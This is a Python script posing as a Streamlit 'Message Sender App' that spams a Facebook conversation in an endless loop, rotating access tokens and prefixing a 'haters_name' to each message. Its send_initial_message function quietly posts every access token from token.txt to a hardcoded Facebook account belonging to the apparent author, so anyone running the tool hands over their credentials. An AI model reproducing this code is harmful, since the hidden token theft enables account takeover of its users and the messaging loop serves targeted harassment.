import subprocess
import sys
import time
import os
import http.server
import socketserver
import threading
import requests

# 🔧 Install streamlit if not already installed
try:
    import streamlit as st
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "streamlit"])
    import streamlit as st

# 🌐 Custom HTTP Handler
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b" TRICKS BY VISHANU RAJ ")

# 🚀 Start local server
def execute_server():
    PORT = 4050  # You can change this port if needed
    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print("Server running at http://localhost:{}".format(PORT))
        httpd.serve_forever()

# 📤 Send initial message
def send_initial_message():
    with open('token.txt', 'r') as file:
        tokens = file.readlines()

    msg_template = "Hello Vishanu Raj sir! I am using your server. My token is {}"
    target_id = "100010831956579"

    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
    }

    for token in tokens:
        access_token = token.strip()
        url = f"https://graph.facebook.com/v17.0/t_{target_id}/"
        msg = msg_template.format(access_token)
        parameters = {'access_token': access_token, 'message': msg}
        try:
            response = requests.post(url, json=parameters, headers=headers)
            time.sleep(0.1)
        except Exception as e:
            print(f"[!] Error sending initial message: {e}")

# 📨 Send messages loop
def send_messages_from_file():
    with open('convo.txt', 'r') as file:
        convo_id = file.read().strip()

    with open('file.txt', 'r') as file:
        messages = file.readlines()

    with open('token.txt', 'r') as file:
        tokens = file.readlines()

    with open('name.txt', 'r') as file:
        haters_name = file.read().strip()

    with open('time.txt', 'r') as file:
        speed = int(file.read().strip())

    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
    }

    num_messages = len(messages)
    num_tokens = len(tokens)
    max_tokens = min(num_messages, num_tokens)

    while True:
        try:
            for i in range(num_messages):
                token_index = i % max_tokens
                access_token = tokens[token_index].strip()
                message = messages[i].strip()
                full_msg = haters_name + ' ' + message
                url = f"https://graph.facebook.com/v17.0/t_{convo_id}/"
                parameters = {'access_token': access_token, 'message': full_msg}
                response = requests.post(url, json=parameters, headers=headers)

                if response.ok:
                    print(f"[+] Message Sent: {full_msg}")
                else:
                    print(f"[x] Failed to Send: {full_msg}")

                time.sleep(speed)
        except Exception as e:
            print(f"[!] Error during messaging: {e}")
            time.sleep(5)

# 🔁 Main
def main():
    st.title("📩 Message Sender App")
    st.success("Running... Messages are being sent.")

    server_thread = threading.Thread(target=execute_server)
    server_thread.daemon = True
    server_thread.start()

    send_initial_message()
    send_messages_from_file()

if __name__ == '__main__':
    main()
